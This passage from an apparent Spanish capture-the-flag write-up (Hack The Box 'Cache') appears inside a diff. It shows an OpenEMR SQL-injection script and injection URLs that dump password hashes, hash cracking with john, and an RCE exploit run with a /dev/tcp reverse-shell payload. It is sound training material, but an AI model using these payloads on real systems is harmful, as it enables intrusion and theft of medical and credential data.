+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[*] Saliendo...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SIGINT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;def_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;url_register&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://hms.htb/portal/account/register.php&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;url_sqli&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://hms.htb/portal/add_edit_event_user.php&quot;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;makeRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;numeroTablas&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url_register&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;numeroTablas&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url_sqli&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'?eid=1 union select null,null,(select table_name from information_schema.tables where table_schema=&quot;openemr&quot; limit {},1),null-- -'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;tableName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r'Unknown column (\'.*?\')'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;tableName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Tabla No {}: {}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tableName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;numeroTablas&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;El número de tablas a ver: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;makeRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;numeroTablas&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 sqli_cache.py
+El número de tablas a ver: 250
+Tabla No 0: addresses
+Tabla No 1: amc_misc_data
+Tabla No 2: amendments
+Tabla No 3: amendments_history
+Tabla No 4: ar_activity
+Tabla No 5: ar_session
+Tabla No 6: array
+Tabla No 7: audit_details
+Tabla No 8: audit_master
+Tabla No 9: automatic_notification
+Tabla No 10: background_services
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+Tabla No 220: template_users
+Tabla No 221: therapy_groups
+Tabla No 222: therapy_groups_counselors
+Tabla No 223: therapy_groups_participant_attendance
+Tabla No 224: therapy_groups_participants
+Tabla No 225: transactions
+Tabla No 226: user_settings
+Tabla No 227: &lt;span class=&quot;nb&quot;&gt;users
+&lt;/span&gt;Tabla No 228: users_facility
+Tabla No 229: users_secure
+Tabla No 230: valueset
+Tabla No 231: version
+Tabla No 232: voids
+Tabla No 233: x12_partners
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+Tabla No 248: 
+Tabla No 249:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos tablas que nos pueden llamar la atención, como &lt;strong&gt;users&lt;/strong&gt; y &lt;strong&gt;users_secure&lt;/strong&gt;.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://hms.htb/portal/add_edit_event_user.php?eid=1 union select null,null,(select column_name from information_schema.columns where table_name=&quot;users_secure&quot; and table_schema=&quot;openemr&quot; limit 0,1),null-- -&lt;/code&gt; Vemos que no le gusta al servidor, por lo que vamos a cambiar un poco la expresión.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://hms.htb/portal/add_edit_event_user.php?eid=1 union select null,null,(select column_type from information_schema.columns where table_name=&quot;users_secure&quot; and table_schema=&quot;openemr&quot; limit 0,1),null-- -&lt;/code&gt; Vemos que si nos acepta el tipo de dato de la columna, que para este caso es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bigint(20)&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://hms.htb/portal/add_edit_event_user.php?eid=1 union select null,null,(select concat(column_name,0x3a,column_type) from information_schema.columns where table_name=&quot;users_secure&quot; and table_schema=&quot;openemr&quot; limit 0,1),null-- -&lt;/code&gt; Ahora podemos ver el nombre de la columna con el tipo de la misma separadas por dos puntos.
+    &lt;ul&gt;
+      &lt;li&gt;id&lt;/li&gt;
+      &lt;li&gt;username&lt;/li&gt;
+      &lt;li&gt;password&lt;/li&gt;
+      &lt;li&gt;salt&lt;/li&gt;
+      &lt;li&gt;last_update&lt;/li&gt;
+      &lt;li&gt;password_history1&lt;/li&gt;
+      &lt;li&gt;salt_history1&lt;/li&gt;
+      &lt;li&gt;password_history2&lt;/li&gt;
+      &lt;li&gt;salt_history2&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://hms.htb/portal/add_edit_event_user.php?eid=1 union select null,null,(select concat(username,0x3a,password,0x3a,salt) from users_secure limit 0,1),null-- -&lt;/code&gt; Obtenemos los datos de la tabla en el formato &lt;strong&gt;username:password:salt&lt;/strong&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Con esto, tenemos el usuairo &lt;strong&gt;openemr_admin&lt;/strong&gt; y un hash, el cual vamos a tratar de romper con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt &lt;span class=&quot;nb&quot;&gt;hash
+&lt;/span&gt;Using default input encoding: UTF-8
+Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bcrypt &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Blowfish 32/64 X3]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Cost 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;iteration count&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is 32 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;all loaded hashes
+Will run 8 OpenMP threads
+Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
+xxxxxx           &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;openemr_admin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+1g 0:00:00:00 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2022-03-12 20:27&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 6.250g/s 5400p/s 5400c/s 5400C/s caitlin..felipe
+Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
+Session completed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya tenemos unas credenciales &lt;strong&gt;openemr_admin : xxxxxx&lt;/strong&gt;, por lo que vamos a validarlas en el panel de login de &lt;strong&gt;openEMR&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-cache/cache-web8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ya ingresamos al panel de administración de &lt;strong&gt;openEMR&lt;/strong&gt;. En el campo &lt;strong&gt;About&lt;/strong&gt; vemos que nos enfrentamos a un &lt;strong&gt;OpenEMR v5.0.1 (3)&lt;/strong&gt;, así que vamos a buscar posibles exploits que nos ayuden a ingresar al sistema.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit openemr 5.0.1
+&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+ Exploit Title                                                                                 |  Path
+&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+OpenEMR 5.0.1 - &lt;span class=&quot;s1&quot;&gt;'controller'&lt;/span&gt; Remote Code Execution                                             | php/webapps/48623.txt
+OpenEMR 5.0.1 - Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                      | php/webapps/48515.py
+OpenEMR 5.0.1 - Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                      | php/webapps/49486.rb
+OpenEMR 5.0.1.3 - &lt;span class=&quot;s1&quot;&gt;'manage_site_files'&lt;/span&gt; Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                    | php/webapps/49998.py
+OpenEMR 5.0.1.3 - &lt;span class=&quot;s1&quot;&gt;'manage_site_files'&lt;/span&gt; Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                | php/webapps/50122.rb
+OpenEMR 5.0.1.3 - &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Arbitrary File Actions                                       | linux/webapps/45202.txt
+OpenEMR 5.0.1.3 - Authentication Bypass                                                        | php/webapps/50017.py
+OpenEMR 5.0.1.3 - Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                        | php/webapps/45161.py
+OpenEMR 5.0.1.7 - &lt;span class=&quot;s1&quot;&gt;'fileName'&lt;/span&gt; Path Traversal &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                    | php/webapps/50037.py
+OpenEMR 5.0.1.7 - &lt;span class=&quot;s1&quot;&gt;'fileName'&lt;/span&gt; Path Traversal &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                | php/webapps/50087.rb
+&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+Shellcodes: No Results
+Papers: No Results
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos varios que nos pueden ayudar y que requerimos de credenciales, las cuales ya las tenemos, así que vamos a descargarnos uno.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; php/webapps/45161.py
+  Exploit: OpenEMR 5.0.1.3 - Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+      URL: https://www.exploit-db.com/exploits/45161
+     Path: /usr/share/exploitdb/exploits/php/webapps/45161.py
+File Type: ASCII text
+
+Copied to: /home/k4miyo/Documentos/HTB/Cache/exploits/45161.py
+❯ &lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;45161.py openemr_rce.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Si lo ejecutamos:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python2 openemr_rce.py
+usage: openemr_rce.py &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; USER] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; PASSWORD] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; CMD] host
+openemr_rce.py: error: the following arguments are required: host
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que nos pide algunos parámetros e incluso, si le echamos un ojo al exploit, nos da un ejemplo de uso para obtener una reverse shell, así que vamos a seguirlo y de paso, nos ponemos en escucha por el puerto 443.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python2 openemr_rce.py http://hms.htb/ &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; openemr_admin &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; xxxxxx &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'nohup bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.27/443 0&amp;gt;&amp;amp;1 &amp;amp;'&lt;/span&gt;
+ .---.  ,---.  ,---.  .-. .-.,---.          ,---.    
+/ .-. &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | .-.&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;| .-&lt;span class=&quot;s1&quot;&gt;'  |  \| || .-'&lt;/span&gt;  |&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;   /|| .-.&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;  
+| | |&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;| |-&lt;span class=&quot;s1&quot;&gt;' )| `-.  |   | || `-.  |(\  / || `-'&lt;/span&gt;/   
+| | | | | |--&lt;span class=&quot;s1&quot;&gt;' | .-'&lt;/span&gt;  | |&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; .-&lt;span class=&quot;s1&quot;&gt;'  (_)\/  ||   (    
+\ `-'&lt;/span&gt; / | |    |  &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;.| | |&lt;span class=&quot;o&quot;&gt;)||&lt;/span&gt;  &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;.| &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; |&lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt;  
+ &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'  /(     /( __.'&lt;/span&gt;/&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;/&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; __.&lt;span class=&quot;s1&quot;&gt;'| |\/| ||_| \)\  
+(_)    (__)   (__)   (__)   (__)    '&lt;/span&gt;-&lt;span class=&quot;s1&quot;&gt;'  '&lt;/span&gt;-&lt;span class=&quot;s1&quot;&gt;'    (__) 
+                                                       
+   ={   P R O J E C T    I N S E C U R I T Y   }=    
+                                                       
+         Twitter : @Insecurity                       
+         Site    : insecurity.sh                     
+
+[$] Authenticating with openemr_admin:xxxxxx
+[$] Injecting payload
+[$] Payload executed
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.188] 54140
+bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1587&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
+bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
+www-data@cache:/var/www/hms.htb/public_html/interface/main&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
+whoami
+&lt;/span&gt;www-data
+www-data@cache:/var/www/hms.htb/public_html/interface/main&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya nos encontramos dentro de la máquina y para trabajar mejor, vamos a hacer un &lt;a href=&quot;/tratamiento-tty&quot;&gt;Tratamiento de la tty&lt;/a&gt;. Si vemos los usuarios del sistema, vemos que efectivamente se encontraba &lt;strong&gt;ash&lt;/strong&gt;, por lo que podriamos tratar de migrar a dicho usuario con las credenciales que tenemos.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@cache:/var/www/hms.htb/public_html/interface/main&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;sh$&quot;&lt;/span&gt;
+root:x:0:0:root:/root:/bin/bash
+ash:x:1000:1000:ash:/home/ash:/bin/bash
+luffy:x:1001:1001:,,,:/home/luffy:/bin/bash
+www-data@cache:/var/www/hms.htb/public_html/interface/main&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+www-data@cache:/var/www/hms.htb/public_html/interface/main&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su ash
+Password: 
+ash@cache:/var/www/hms.htb/public_html/interface/main&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;ash
+ash@cache:/var/www/hms.htb/public_html/interface/main&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya somos el usuario &lt;strong&gt;ash&lt;/strong&gt; y podemos visualizar la flag (user.txt). Ahora vamos a enumerar un poco el sistema para ver de que forma nos podemos convertir en root.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ash@cache:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ash&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ash&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ash&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ash@cache:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;ash: 
+ash@cache:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+ash@cache:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;perm &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; 2&amp;gt;/dev/null                                                                                       
+./bin/su                                                                                                                         
+./bin/fusermount                                                                                                                 
+./bin/mount                                                                                                                      
+./bin/ping
+./bin/umount
+./snap/core/9436/bin/mount
+./snap/core/9436/bin/ping
+./snap/core/9436/bin/ping6
+./snap/core/9436/bin/su
+./snap/core/9436/bin/umount
+./snap/core/9436/usr/bin/chfn
